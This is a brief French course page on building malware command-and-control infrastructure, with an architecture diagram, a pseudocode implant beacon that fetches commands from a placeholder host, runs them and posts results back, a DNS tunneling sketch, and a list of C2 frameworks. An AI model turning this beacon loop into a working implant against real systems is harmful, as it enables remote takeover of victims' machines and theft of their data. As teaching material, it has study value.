# Cours : C2 Development - Command & Control

## 1. Introduction

**C2** (Command & Control) = Infrastructure pour contrôler des malwares à distance.

```ascii
ARCHITECTURE C2 :

ATTAQUANT                  C2 SERVER              VICTIMES
┌──────────┐              ┌──────────┐           ┌──────────┐
│ Operator │─Commandes──→│ C2       │←─Beacon───│ Victime 1│
│ Console  │←─Résultats──│ Server   │─Commandes→│ Implant  │
└──────────┘              │ (VPS)    │←─Résultats│          │
                          └────┬─────┘           └──────────┘
                               │
                               │←─Beacon─┐       ┌──────────┐
                               │─Commands┤───────│ Victime 2│
                               │←─Results┘       │ Implant  │
                               │                 └──────────┘
                               ↓
                          [Logs, DB]
```

## 2. Protocoles C2

### 2.1 HTTP(S)

```c
// Implant beacon
while (1) {
    char *cmd = http_get("https://c2.com/tasks");
    char *result = execute(cmd);
    http_post("https://c2.com/results", result);
    sleep(60);  // Jitter
}
```

### 2.2 DNS Tunneling

```ascii
Encoder données dans requêtes DNS :

DNS Query : deadbeef1234.c2domain.com
             └─────────┘
             Données encodées

C2 répond via DNS TXT records
```

### 2.3 Frameworks

- **Cobalt Strike** : Commercial, très utilisé
- **Metasploit** : Open-source
- **Empire** : PowerShell C2
- **Covenant** : .NET C2

## Ressources

- [C2 Matrix](https://www.thec2matrix.com/)
- [Cobalt Strike](https://www.cobaltstrike.com/)

